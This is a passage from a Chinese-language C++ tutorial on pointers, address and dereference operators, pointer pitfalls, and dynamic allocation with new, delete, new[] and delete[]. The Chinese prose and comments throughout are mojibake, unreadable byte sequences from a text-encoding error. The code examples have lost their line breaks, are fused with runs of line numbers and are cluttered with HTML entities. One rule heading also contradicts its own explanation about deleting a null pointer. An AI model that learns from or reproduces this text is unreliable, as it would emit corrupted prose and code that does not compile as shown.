ç±»å‹çš„æŒ‡é’ˆ p_intdouble * p_double; // å£°æ˜ä¸€ä¸ªæŒ‡å‘ double ç±»å‹çš„æŒ‡é’ˆ p_doublechar * p_char; // å£°æ˜ä¸€ä¸ªæŒ‡å‘ char ç±»å‹çš„æŒ‡é’ˆ p_charstd::string * p_str; // å£°æ˜ä¸€ä¸ªæŒ‡å‘ string å¯¹è±¡çš„æŒ‡é’ˆ p_str è·å–åœ°å€ (&amp; è¿ç®—ç¬¦): åœ°å€è¿ç®—ç¬¦ &amp; ç”¨äºè·å–ä¸€ä¸ªå˜é‡çš„å†…å­˜åœ°å€ã€‚ åˆå§‹åŒ–æŒ‡é’ˆ: æŒ‡é’ˆåœ¨å£°æ˜æ—¶åº”è¢«åˆå§‹åŒ–ï¼Œä»¥é¿å…æŒ‡å‘ä¸ç¡®å®šçš„å†…å­˜åœ°å€ã€‚å¸¸è§çš„åˆå§‹åŒ–æ–¹å¼ï¼š åˆå§‹åŒ–ä¸º nullptr (C++11 åŠä»¥å): nullptr æ˜¯è¡¨ç¤ºç©ºæŒ‡é’ˆçš„å…³é”®å­—ï¼Œè¡¨ç¤ºè¯¥æŒ‡é’ˆå½“å‰ä¸æŒ‡å‘ä»»ä½•æœ‰æ•ˆçš„å†…å­˜åœ°å€ã€‚è¿™æ˜¯æ¨èçš„åˆå§‹åŒ–ç©ºæŒ‡é’ˆçš„æ–¹å¼ã€‚ åˆå§‹åŒ–ä¸º 0 æˆ– NULL: åœ¨ C++11 ä¹‹å‰ï¼Œé€šå¸¸ä½¿ç”¨ 0 æˆ–å® NULL (é€šå¸¸å®šä¹‰ä¸º 0) æ¥è¡¨ç¤ºç©ºæŒ‡é’ˆã€‚è™½ç„¶ä»å¯ç”¨ï¼Œä½† nullptr ç±»å‹æ›´å®‰å…¨ã€‚ åˆå§‹åŒ–ä¸ºå˜é‡åœ°å€: ä½¿ç”¨ &amp; è¿ç®—ç¬¦è·å–ä¸€ä¸ªå·²å­˜åœ¨å˜é‡çš„åœ°å€æ¥åˆå§‹åŒ–æŒ‡é’ˆã€‚æŒ‡é’ˆçš„ç±»å‹å¿…é¡»ä¸å˜é‡çš„ç±»å‹åŒ¹é…ï¼ˆæˆ–èƒ½éšå¼è½¬æ¢ï¼‰ã€‚ è§£å¼•ç”¨ (* è¿ç®—ç¬¦): è§£å¼•ç”¨è¿ç®—ç¬¦ * ç”¨äºè®¿é—®æŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å­˜åœ°å€å¤„å­˜å‚¨çš„å€¼ã€‚å½“ * ç”¨äºå·²åˆå§‹åŒ–çš„æœ‰æ•ˆæŒ‡é’ˆå˜é‡å‰æ—¶ï¼Œå®ƒè¡¨ç¤ºâ€œè·å–æŒ‡é’ˆæŒ‡å‘çš„å€¼â€ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; int updates = 6; int * p_updates; // å£°æ˜ä¸€ä¸ªæŒ‡å‘ int çš„æŒ‡é’ˆï¼Œæœªåˆå§‹åŒ– (å±é™©!) // åˆå§‹åŒ–æŒ‡é’ˆ int * p_value = nullptr; // åˆå§‹åŒ–ä¸ºç©ºæŒ‡é’ˆ (æ¨è) int * p_zero = 0; // åˆå§‹åŒ–ä¸ºç©ºæŒ‡é’ˆ (æ—§å¼) // NULL å®é€šå¸¸åœ¨ &lt;cstddef&gt; æˆ–å…¶ä»– C å¤´æ–‡ä»¶ä¸­å®šä¹‰ // ä½¿ç”¨åœ°å€åˆå§‹åŒ– p_updates = &amp;updates; // å°† updates å˜é‡çš„åœ°å€èµ‹ç»™ p_updates // è®¿é—®æŒ‡é’ˆä¿¡æ¯ std::cout &lt;&lt; &quot;Value of updates: &quot; &lt;&lt; updates &lt;&lt; std::endl; // è¾“å‡º 6 std::cout &lt;&lt; &quot;Address of updates: &quot; &lt;&lt; &amp;updates &lt;&lt; std::endl; // è¾“å‡º updates çš„å†…å­˜åœ°å€ std::cout &lt;&lt; &quot;Value of p_updates (address): &quot; &lt;&lt; p_updates &lt;&lt; std::endl; // è¾“å‡ºå­˜å‚¨åœ¨ p_updates ä¸­çš„åœ°å€ (åŒä¸Š) // ä½¿ç”¨è§£å¼•ç”¨è¿ç®—ç¬¦è®¿é—®æŒ‡é’ˆæŒ‡å‘çš„å€¼ std::cout &lt;&lt; &quot;Value at *p_updates: &quot; &lt;&lt; *p_updates &lt;&lt; std::endl; // è¾“å‡º 6 (updates çš„å€¼) // ä½¿ç”¨è§£å¼•ç”¨è¿ç®—ç¬¦ä¿®æ”¹æŒ‡é’ˆæŒ‡å‘çš„å€¼ *p_updates = *p_updates + 1; // å°† p_updates æŒ‡å‘çš„å€¼ (updates) åŠ  1 std::cout &lt;&lt; &quot;Now updates has value: &quot; &lt;&lt; updates &lt;&lt; std::endl; // è¾“å‡º 7 // æŒ‡å‘å…¶ä»–ç±»å‹ double price = 99.99; double * p_price = &amp;price; // p_price æŒ‡å‘ price std::cout &lt;&lt; &quot;Value at *p_price: &quot; &lt;&lt; *p_price &lt;&lt; std::endl; // è¾“å‡º 99.99 // int * p_wrong = &amp;price; // é”™è¯¯! æŒ‡é’ˆç±»å‹ (int*) ä¸å˜é‡ç±»å‹ (double) ä¸åŒ¹é… return 0;&#125; å…³é”®ç‚¹: int updates;: updates æ˜¯ä¸€ä¸ª int å˜é‡ã€‚ int * p_updates;: p_updates æ˜¯ä¸€ä¸ªæŒ‡é’ˆå˜é‡ï¼Œå®ƒå­˜å‚¨çš„æ˜¯ä¸€ä¸ª int å˜é‡çš„åœ°å€ã€‚ p_updates: å­˜å‚¨çš„åœ°å€å€¼ã€‚ *p_updates: å­˜å‚¨åœ¨è¯¥åœ°å€å¤„çš„ int å€¼ã€‚ 4.7.2 æŒ‡é’ˆçš„å±é™©æŒ‡é’ˆéå¸¸å¼ºå¤§ï¼Œä½†ä¹Ÿå®¹æ˜“å‡ºé”™ï¼Œæ˜¯ C++ ä¸­å¸¸è§çš„ bug æ¥æºã€‚ è§£å¼•ç”¨æœªåˆå§‹åŒ–çš„æŒ‡é’ˆ: å¦‚æœæŒ‡é’ˆæ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œå®ƒä¼šåŒ…å«ä¸€ä¸ªéšæœºçš„åœ°å€ï¼ˆåƒåœ¾å€¼ï¼‰ã€‚è§£å¼•ç”¨è¿™ç§æŒ‡é’ˆï¼ˆè¯•å›¾è®¿é—®è¯¥éšæœºåœ°å€å¤„çš„å€¼ï¼‰ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºï¼Œé€šå¸¸å¯¼è‡´ç¨‹åºå´©æºƒã€‚ 123int * p_uninitialized;// std::cout &lt;&lt; *p_uninitialized; // æåº¦å±é™©! ç¨‹åºå¯èƒ½å´©æºƒ// *p_uninitialized = 100; // æåº¦å±é™©! å¯èƒ½è¦†ç›–å…³é”®æ•°æ®æˆ–å¯¼è‡´å´©æºƒ è§£å¼•ç”¨ç©ºæŒ‡é’ˆ: è§£å¼•ç”¨ nullptr (æˆ– 0, NULL) åŒæ ·æ˜¯æœªå®šä¹‰è¡Œä¸ºï¼Œé€šå¸¸ä¹Ÿä¼šå¯¼è‡´ç¨‹åºå´©æºƒã€‚åœ¨ä½¿ç”¨æŒ‡é’ˆå‰ï¼Œæœ€å¥½æ£€æŸ¥å®ƒæ˜¯å¦ä¸ºç©ºã€‚ 12345int * p_null = nullptr;// std::cout &lt;&lt; *p_null; // å±é™©! ç¨‹åºå¯èƒ½å´©æºƒif (p_null != nullptr) &#123; // æ£€æŸ¥æŒ‡é’ˆæ˜¯å¦æœ‰æ•ˆ std::cout &lt;&lt; *p_null; &#125; æ‚¬æŒ‚æŒ‡é’ˆ (Dangling Pointer): å½“æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜å·²ç»è¢«é‡Šæ”¾æˆ–ä¸å†æœ‰æ•ˆæ—¶ï¼Œè¯¥æŒ‡é’ˆå°±æˆä¸ºæ‚¬æŒ‚æŒ‡é’ˆã€‚è§£å¼•ç”¨æ‚¬æŒ‚æŒ‡é’ˆä¹Ÿæ˜¯æœªå®šä¹‰è¡Œä¸ºã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨ delete ä¹‹åï¼ˆè§ 4.7.5ï¼‰æˆ–æŒ‡å‘å±€éƒ¨å˜é‡çš„æŒ‡é’ˆåœ¨å…¶ä½œç”¨åŸŸç»“æŸåä»ç„¶å­˜åœ¨æ—¶ã€‚ 123456int * p_dangle;&#123; int local_var = 10; p_dangle = &amp;local_var; // p_dangle æŒ‡å‘å±€éƒ¨å˜é‡&#125; // local_var åœ¨è¿™é‡Œè¢«é”€æ¯ï¼Œå†…å­˜å¯èƒ½è¢«å›æ”¶// std::cout &lt;&lt; *p_dangle; // å±é™©! p_dangle æ˜¯æ‚¬æŒ‚æŒ‡é’ˆ å†…å­˜æ³„æ¼ (Memory Leak): å¦‚æœä½¿ç”¨ new åˆ†é…äº†å†…å­˜ï¼ˆè§ 4.7.4ï¼‰ï¼Œä½†å¿˜è®°ä½¿ç”¨ delete é‡Šæ”¾ï¼Œæˆ–è€…ä¸¢å¤±äº†æŒ‡å‘è¯¥å†…å­˜çš„å”¯ä¸€æŒ‡é’ˆï¼Œè¿™å—å†…å­˜å°±æ— æ³•å†è¢«ç¨‹åºè®¿é—®æˆ–é‡Šæ”¾ï¼Œé€ æˆå†…å­˜æ³„æ¼ã€‚ç¨‹åºè¿è¡Œæ—¶é—´è¶Šé•¿ï¼Œæ³„æ¼çš„å†…å­˜è¶Šå¤šï¼Œæœ€ç»ˆå¯èƒ½è€—å°½ç³»ç»Ÿèµ„æºã€‚ å®‰å…¨ä½¿ç”¨æŒ‡é’ˆçš„å»ºè®®: æ€»æ˜¯åˆå§‹åŒ–æŒ‡é’ˆ: å£°æ˜æŒ‡é’ˆæ—¶ç«‹å³åˆå§‹åŒ–ä¸º nullptr æˆ–ä¸€ä¸ªæœ‰æ•ˆçš„åœ°å€ã€‚ åœ¨ä½¿ç”¨å‰æ£€æŸ¥: åœ¨è§£å¼•ç”¨æŒ‡é’ˆå‰ï¼Œæ£€æŸ¥å®ƒæ˜¯å¦ä¸º nullptrã€‚ è°¨æ…å¤„ç†æŒ‡é’ˆç”Ÿå‘½å‘¨æœŸ: ç¡®ä¿æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åœ¨æŒ‡é’ˆä½¿ç”¨æœŸé—´æ˜¯æœ‰æ•ˆçš„ã€‚ é…å¯¹ new å’Œ delete: åŠ¨æ€åˆ†é…çš„å†…å­˜å¿…é¡»æ‰‹åŠ¨é‡Šæ”¾ã€‚ 4.7.3 æŒ‡é’ˆå’Œæ•°å­—è™½ç„¶æŒ‡é’ˆå­˜å‚¨çš„æ˜¯å†…å­˜åœ°å€ï¼Œè€Œåœ°å€æœ¬è´¨ä¸Šæ˜¯æ•°å­—ï¼Œä½†æŒ‡é’ˆç±»å‹å’Œæ•´æ•°ç±»å‹æ˜¯ä¸åŒçš„ã€‚ä¸èƒ½éšæ„å°†æ•´æ•°èµ‹ç»™æŒ‡é’ˆï¼ˆé™¤äº† 0/nullptrï¼‰ï¼Œä¹Ÿä¸èƒ½ç›´æ¥å°†æŒ‡é’ˆå½“ä½œæ™®é€šæ•´æ•°è¿›è¡Œç®—æœ¯è¿ç®—ï¼ˆæŒ‡é’ˆç®—æœ¯æœ‰ç‰¹æ®Šè§„åˆ™ï¼Œè§ 4.8ï¼‰ã€‚ 1234567891011121314151617181920212223242526#include &lt;iostream&gt;int main() &#123; int value = 10; int * p_value = &amp;value; // æŒ‡é’ˆçš„å€¼æ˜¯åœ°å€ (ä¸€ä¸ªæ•°å­—) std::cout &lt;&lt; &quot;Address stored in p_value: &quot; &lt;&lt; p_value &lt;&lt; std::endl; // ä¸èƒ½ç›´æ¥å°†ä»»æ„æ•´æ•°èµ‹ç»™æŒ‡é’ˆ // p_value = 1000; // é”™è¯¯! ç±»å‹ä¸åŒ¹é… (é™¤éä½¿ç”¨ reinterpret_castï¼Œä½†é€šå¸¸ä¸å®‰å…¨) p_value = nullptr; // åˆæ³•ï¼Œèµ‹ç©ºæŒ‡é’ˆ p_value = 0; // åˆæ³•ï¼Œèµ‹ç©ºæŒ‡é’ˆ // æŒ‡é’ˆå¯ä»¥è½¬æ¢ä¸ºæ•´æ•° (é€šå¸¸ä½¿ç”¨ reinterpret_castï¼Œä¸æ¨è) // uintptr_t address_as_int = reinterpret_cast&lt;uintptr_t&gt;(p_value); // std::cout &lt;&lt; &quot;Address as integer: &quot; &lt;&lt; address_as_int &lt;&lt; std::endl; // æ•´æ•°ä¸èƒ½ç›´æ¥è½¬æ¢ä¸ºæŒ‡é’ˆ (é™¤äº† 0) int address_int = 2000; // int * p_from_int = address_int; // é”™è¯¯! // int * p_from_int = reinterpret_cast&lt;int*&gt;(address_int); // å¯ä»¥ç¼–è¯‘ï¼Œä½†æåº¦å±é™© return 0;&#125; å°†æŒ‡é’ˆè§†ä¸ºåœ°å€ï¼Œè€Œä¸æ˜¯æ™®é€šçš„æ•°å­—ï¼Œæœ‰åŠ©äºé¿å…ç±»å‹é”™è¯¯å’Œä¸å®‰å…¨çš„æ“ä½œã€‚ 4.7.4 ä½¿ç”¨newæ¥åˆ†é…å†…å­˜new è¿ç®—ç¬¦ç”¨äºåœ¨ç¨‹åºçš„è‡ªç”±å­˜å‚¨åŒº (Free Store) æˆ– å † (Heap) ä¸ŠåŠ¨æ€åˆ†é…å†…å­˜ã€‚è¿™å…è®¸ä½ åœ¨è¿è¡Œæ—¶æ ¹æ®éœ€è¦åˆ›å»ºå˜é‡æˆ–å¯¹è±¡ï¼Œè€Œä¸æ˜¯åœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šã€‚ è¯­æ³•: 123456pointerVariable = new typeName;// æˆ–è€…åœ¨å£°æ˜æ—¶åˆ†é…typeName * pointerVariable = new typeName;// ä¹Ÿå¯ä»¥å¸¦åˆå§‹åŒ–å™¨typeName * pointerVariable = new typeName (initializer); // C++98/03typeName * pointerVariable = new typeName &#123;initializer&#125;; // C++11 åˆ—è¡¨åˆå§‹åŒ– new: è¿ç®—ç¬¦ã€‚ typeName: è¦åˆ†é…å†…å­˜çš„æ•°æ®ç±»å‹ã€‚ initializer (å¯é€‰): ç”¨äºåˆå§‹åŒ–æ–°åˆ†é…å†…å­˜çš„å€¼ã€‚ å·¥ä½œæµç¨‹: new åœ¨è‡ªç”±å­˜å‚¨åŒºæ‰¾åˆ°ä¸€å—è¶³å¤Ÿå¤§çš„ã€æœªä½¿ç”¨çš„å†…å­˜å—ï¼Œä»¥å­˜å‚¨ typeName ç±»å‹çš„æ•°æ®ã€‚ new è¿”å›è¿™å—å†…å­˜çš„èµ·å§‹åœ°å€ã€‚ è¿™ä¸ªåœ°å€è¢«èµ‹ç»™ä¸€ä¸ªç›¸åº”ç±»å‹çš„æŒ‡é’ˆå˜é‡ã€‚ å¦‚æœ new æ— æ³•åˆ†é…æ‰€éœ€çš„å†…å­˜ï¼ˆä¾‹å¦‚å†…å­˜ä¸è¶³ï¼‰ï¼Œå®ƒä¼šæŠ›å‡ºä¸€ä¸ª std::bad_alloc å¼‚å¸¸ï¼ˆé™¤éä½¿ç”¨äº† new (std::nothrow) ç‰ˆæœ¬ï¼Œè¯¥ç‰ˆæœ¬åœ¨å¤±è´¥æ—¶è¿”å› nullptrï¼‰ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;new&gt; // ä¸ºäº† std::bad_alloc (è™½ç„¶ä¸ä¸€å®šéœ€è¦æ˜¾å¼åŒ…å«) å’Œ std::nothrowint main() &#123; // åˆ†é…ä¸€ä¸ª int çš„å†…å­˜ int * p_int = new int; // åœ¨è‡ªç”±å­˜å‚¨åŒºåˆ†é…ä¸€ä¸ª int å¤§å°çš„å†…å­˜ if (p_int == nullptr) &#123; // ç†è®ºæ£€æŸ¥ (å¯¹äºæ™®é€š newï¼Œå¤±è´¥ä¼šæŠ›å¼‚å¸¸) std::cout &lt;&lt; &quot;Memory allocation failed!&quot; &lt;&lt; std::endl; return 1; &#125; *p_int = 101; // é€šè¿‡æŒ‡é’ˆè®¿é—®å¹¶èµ‹å€¼ // åˆ†é…ä¸€ä¸ª double å¹¶åˆå§‹åŒ– double * p_double = new double (99.99); // åˆ†é…å¹¶åˆå§‹åŒ–ä¸º 99.99 // æˆ–è€… C++11 åˆ—è¡¨åˆå§‹åŒ– // double * p_double = new double &#123;99.99&#125;; std::cout &lt;&lt; &quot;Dynamically allocated int: &quot; &lt;&lt; *p_int &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Dynamically allocated double: &quot; &lt;&lt; *p_double &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Address of int: &quot; &lt;&lt; p_int &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Address of double: &quot; &lt;&lt; p_double &lt;&lt; std::endl; // --- å†…å­˜é‡Šæ”¾å°†åœ¨ä¸‹ä¸€èŠ‚è®²è§£ --- // delete p_int; // delete p_double; // ä½¿ç”¨ nothrow ç‰ˆæœ¬ (å¤±è´¥æ—¶è¿”å› nullptr) int * p_lots_of_ints = new (std::nothrow) int[1000000000]; // å°è¯•åˆ†é…å·¨å¤§æ•°ç»„ if (p_lots_of_ints == nullptr) &#123; std::cout &lt;&lt; &quot;Huge memory allocation failed, but program continues.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Huge memory allocation succeeded (unlikely).&quot; &lt;&lt; std::endl; // delete[] p_lots_of_ints; // å¦‚æœæˆåŠŸï¼Œéœ€è¦é‡Šæ”¾ &#125; return 0;&#125; åŠ¨æ€åˆ†é…çš„å†…å­˜ä¸ä¼šåƒè‡ªåŠ¨å˜é‡é‚£æ ·åœ¨ä½œç”¨åŸŸç»“æŸæ—¶è‡ªåŠ¨é‡Šæ”¾ã€‚ç¨‹åºå‘˜å¿…é¡»è´Ÿè´£åœ¨ä¸å†éœ€è¦æ—¶æ‰‹åŠ¨é‡Šæ”¾å®ƒã€‚ 4.7.5 ä½¿ç”¨deleteé‡Šæ”¾å†…å­˜delete è¿ç®—ç¬¦ç”¨äºé‡Šæ”¾ç”± new åˆ†é…çš„å†…å­˜ï¼Œå°†å…¶å½’è¿˜ç»™è‡ªç”±å­˜å‚¨åŒºï¼Œä»¥ä¾¿åç»­å¯ä»¥é‡æ–°åˆ†é…ä½¿ç”¨ã€‚ è¯­æ³•: 1delete pointerVariable; delete: è¿ç®—ç¬¦ã€‚ pointerVariable: æŒ‡å‘ç”± newï¼ˆ**ä¸æ˜¯ new[]**ï¼‰åˆ†é…çš„å†…å­˜çš„æŒ‡é’ˆã€‚ å·¥ä½œæµç¨‹: delete æ¥æ”¶ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆå¿…é¡»æŒ‡å‘ç”± new åˆ†é…çš„å†…å­˜å—çš„èµ·å§‹åœ°å€ã€‚ delete é‡Šæ”¾è¯¥æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜å—ã€‚ æŒ‡é’ˆå˜é‡æœ¬èº«çš„å€¼ä¸ä¼šè¢«è‡ªåŠ¨ä¿®æ”¹ï¼ˆå®ƒä»ç„¶å­˜å‚¨ç€é‚£ä¸ªç°åœ¨æ— æ•ˆçš„åœ°å€ï¼‰ï¼Œæˆä¸º**æ‚¬æŒ‚æŒ‡é’ˆ (Dangling Pointer)**ã€‚ é‡è¦è§„åˆ™: new å’Œ delete å¿…é¡»é…å¯¹ä½¿ç”¨: æ¯ä¸ª new éƒ½åº”è¯¥å¯¹åº”ä¸€ä¸ª deleteã€‚ ä¸è¦ delete åŒä¸€å—å†…å­˜ä¸¤æ¬¡: å¯¹åŒä¸€å—å†…å­˜æ‰§è¡Œä¸¤æ¬¡ delete æ˜¯æœªå®šä¹‰è¡Œä¸ºã€‚ ä¸è¦ delete ä¸æ˜¯ç”± new åˆ†é…çš„å†…å­˜: ä¾‹å¦‚ï¼Œä¸è¦ delete æŒ‡å‘è‡ªåŠ¨å˜é‡ï¼ˆæ ˆå˜é‡ï¼‰æˆ–é™æ€å˜é‡çš„æŒ‡é’ˆã€‚ ä¸è¦ delete ç©ºæŒ‡é’ˆ (nullptr): å¯¹ç©ºæŒ‡é’ˆæ‰§è¡Œ delete æ˜¯å®‰å…¨ä¸”æ— æ•ˆæœçš„ã€‚ delete ä¹‹åå°†æŒ‡é’ˆè®¾ä¸º nullptr: é‡Šæ”¾å†…å­˜åï¼Œæœ€å¥½ç«‹å³å°†æŒ‡é’ˆè®¾ç½®ä¸º nullptrï¼Œä»¥é˜²æ­¢å®ƒæˆä¸ºæ‚¬æŒ‚æŒ‡é’ˆè¢«æ„å¤–ä½¿ç”¨ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;int main() &#123; // 1. åˆ†é…å†…å­˜ int * p_value = new int (42); double * p_temp = new double; *p_temp = 123.45; std::cout &lt;&lt; &quot;Before delete:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; p_value points to: &quot; &lt;&lt; *p_value &lt;&lt; &quot; at address &quot; &lt;&lt; p_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot; p_temp points to: &quot; &lt;&lt; *p_temp &lt;&lt; &quot; at address &quot; &lt;&lt; p_temp &lt;&lt; std::endl; // 2. é‡Šæ”¾å†…å­˜ delete p_value; delete p_temp; std::cout &lt;&lt; &quot;\\nAfter delete:&quot; &lt;&lt; std::endl; // p_value å’Œ p_temp ç°åœ¨æ˜¯æ‚¬æŒ‚æŒ‡é’ˆ! std::cout &lt;&lt; &quot; p_value still holds address: &quot; &lt;&lt; p_value &lt;&lt; std::endl; // std::cout &lt;&lt; &quot; Accessing *p_value: &quot; &lt;&lt; *p_value &lt;&lt; std::endl; // å±é™©! æœªå®šä¹‰è¡Œä¸º // 3. å°†æŒ‡é’ˆè®¾ä¸º nullptr (å¥½ä¹ æƒ¯) p_value = nullptr; p_temp = nullptr; std::cout &lt;&lt; &quot;After setting to nullptr:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; p_value holds: &quot; &lt;&lt; p_value &lt;&lt; std::endl; // è¾“å‡º 0 æˆ–ç±»ä¼¼è¡¨ç¤ºç©ºæŒ‡é’ˆçš„å€¼ // å¯¹ nullptr è°ƒç”¨ delete æ˜¯å®‰å…¨çš„ delete p_value; // æ— æ•ˆæœ delete p_temp; // æ— æ•ˆæœ // é”™è¯¯ç¤ºä¾‹: int stack_var = 10; int * p_stack = &amp;stack_var; // delete p_stack; // ä¸¥é‡é”™è¯¯! ä¸èƒ½ delete æ ˆå†…å­˜ int * p1 = new int; int * p2 = p1; // p1 å’Œ p2 æŒ‡å‘åŒä¸€å—å†…å­˜ delete p1; // delete p2; // ä¸¥é‡é”™è¯¯! åˆ é™¤äº†åŒä¸€å—å†…å­˜ä¸¤æ¬¡ return 0;&#125; å¿˜è®° delete ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ï¼Œè€Œé”™è¯¯åœ°ä½¿ç”¨ delete åˆ™å¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒæˆ–æ•°æ®æŸåã€‚æ­£ç¡®ç®¡ç†åŠ¨æ€å†…å­˜æ˜¯ C++ ç¼–ç¨‹ä¸­çš„ä¸€é¡¹é‡è¦æŠ€èƒ½ã€‚ 4.7.6 ä½¿ç”¨newæ¥åˆ›å»ºåŠ¨æ€æ•°ç»„é™¤äº†åˆ†é…å•ä¸ªå˜é‡çš„å†…å­˜ï¼Œnew ä¹Ÿå¯ä»¥ç”¨æ¥åŠ¨æ€åˆ†é…æ•°ç»„ã€‚è¿™åœ¨ä½ éœ€è¦åœ¨è¿è¡Œæ—¶ç¡®å®šæ•°ç»„å¤§å°æ—¶éå¸¸æœ‰ç”¨ã€‚ è¯­æ³•: 123pointerVariable = new typeName [numberOfElements];// æˆ–è€…typeName * pointerVariable = new typeName [numberOfElements]; new: è¿ç®—ç¬¦ã€‚ typeName: æ•°ç»„å…ƒç´ çš„æ•°æ®ç±»å‹ã€‚ numberOfElements: æ•°ç»„çš„å¤§å°ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªå˜é‡æˆ–è¡¨è¾¾å¼ï¼Œåœ¨è¿è¡Œæ—¶è®¡ç®—å…¶å€¼ã€‚ []: è¡¨æ˜è¦åˆ†é…çš„æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ new[] ä¼šåˆ†é…ä¸€å—è¿ç»­çš„å†…å­˜ï¼Œè¶³ä»¥å®¹çº³ numberOfElements ä¸ª typeName ç±»å‹çš„å…ƒç´ ï¼Œå¹¶è¿”å›æŒ‡å‘æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆã€‚ é‡Šæ”¾åŠ¨æ€æ•°ç»„ (delete[]): é‡Šæ”¾ç”± new[] åˆ†é…çš„æ•°ç»„å†…å­˜å¿…é¡»ä½¿ç”¨ delete[] è¿ç®—ç¬¦ï¼Œè€Œä¸æ˜¯ deleteã€‚ 1delete [] pointerVariable; delete[]: ç”¨äºé‡Šæ”¾æ•°ç»„å†…å­˜çš„è¿ç®—ç¬¦ã€‚ pointerVariable: æŒ‡å‘ç”± new[] åˆ†é…çš„æ•°ç»„å†…å­˜çš„æŒ‡é’ˆã€‚ delete[] å’Œ delete çš„åŒºåˆ«è‡³å…³é‡è¦: delete[] çŸ¥é“éœ€è¦é‡Šæ”¾çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå®ƒä¼šæ­£ç¡®åœ°è°ƒç”¨æ•°ç»„ä¸­æ¯ä¸ªå¯¹è±¡ï¼ˆå¦‚æœæ˜¯ç±»ç±»å‹ï¼‰çš„ææ„å‡½æ•°ï¼ˆå¦‚æœéœ€è¦ï¼‰ï¼Œå¹¶é‡Šæ”¾æ•´ä¸ªæ•°ç»„å ç”¨çš„å†…å­˜ã€‚ å¦‚æœå¯¹ new[] åˆ†é…çš„å†…å­˜ä½¿ç”¨ deleteï¼ˆæ²¡æœ‰ []ï¼‰ï¼Œè¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ã€‚å¯¹äºåŸºæœ¬ç±»å‹å¯èƒ½çœ‹ä¼¼æ­£å¸¸å·¥ä½œï¼ˆä½†ä»æ˜¯é”™è¯¯çš„ï¼‰ï¼Œä½†å¯¹äºåŒ…å«å¯¹è±¡çš„æ•°ç»„ï¼Œå¾ˆå¯èƒ½åªè°ƒç”¨ç¬¬ä¸€ä¸ªå¯¹è±¡çš„ææ„å‡½æ•°ï¼Œå¹¶å¯èƒ½å¯¼è‡´å†…å­˜æŸåæˆ–æ³„æ¼ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;int main() &#123; int size; std::cout &lt;&lt; &quot;Enter the size of the dynamic array: &quot;; std::cin &gt;&gt; size; if (size &lt;= 0) &#123; std::cout &lt;&lt; &quot;Invalid size.&quot; &lt;&lt; std::endl; return 1; &#125; // 1. ä½¿ç”¨ new[] åˆ†é…åŠ¨æ€æ•°ç»„ int * dynArray = new int[size]; // æ£€æŸ¥åˆ†é…æ˜¯å¦æˆåŠŸ (å¯é€‰ï¼Œå¯¹äºæ™®é€š new[] å¤±è´¥ä¼šæŠ›å¼‚å¸¸) if (dynArray == nullptr) &#123; std::cout &lt;&lt; &quot;Memory allocation failed!&quot; &lt;&lt; std::endl; return 1; &#125; // 2. åƒæ™®é€šæ•°ç»„ä¸€æ ·ä½¿ç”¨æŒ‡é’ˆè®¿é—®åŠ¨æ€æ•°ç»„å…ƒç´  for (int i = 0; i &lt; size; ++i) &#123; dynArray[i] = i * 10; // ä½¿ç”¨æ•°ç»„ä¸‹æ ‡è®¿é—® &#125; std::cout &lt;&lt; &quot;Dynamic array elements:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; size; ++i) &#123; std::cout &lt;&lt; &quot; dynArray[&quot; &lt;&lt; i &lt;&lt; &quot;] = &quot; &lt;&lt; *(dynArray + i) &lt;&lt; std::endl; // ä¹Ÿå¯ä»¥ä½¿ç”¨æŒ‡é’ˆç®—æœ¯è®¿é—® &#125; // 3. ä½¿ç”¨ delete[] é‡Šæ”¾åŠ¨æ€æ•°ç»„å†…å­˜ delete [] dynArray; // 4. å°†æŒ‡é’ˆè®¾ä¸º nullptr (å¥½ä¹ æƒ¯) dynArray = nullptr; std::cout &lt;&lt; &quot;Dynamic array deleted.&quot; &lt;&lt; std::endl; // é”™è¯¯ç¤ºä¾‹: double * p_arr = new double[10]; // delete p_arr; // é”™è¯¯! åº”è¯¥ä½¿ç”¨ delete [] p_arr; return 0;&#125; æ€»ç»“: ä½¿ç”¨ new typeName[size] åˆ†é…åŠ¨æ€æ•°ç»„ã€‚ ä½¿ç”¨ delete [] pointerVariable é‡Šæ”¾åŠ¨æ€æ•°ç»„ã€‚ å¿…é¡»åŒ¹é… new[] å’Œ delete[]ï¼Œå¦åˆ™è¡Œä¸ºæœªå®šä¹‰ã€‚ åŠ¨æ€æ•°ç»„æä¾›äº†åœ¨è¿è¡Œæ—¶ç¡®å®šæ•°ç»„å¤§å°çš„çµæ´»æ€§ï¼Œä½†éœ€è¦ç¨‹åºå‘˜è´Ÿè´£å†…å­˜ç®¡ç†ã€‚ 4.8 æŒ‡é’ˆã€æ•°ç»„å’ŒæŒ‡é’ˆç®—æœ¯æŒ‡é’ˆå’Œæ•°ç»„åœ¨ C++ 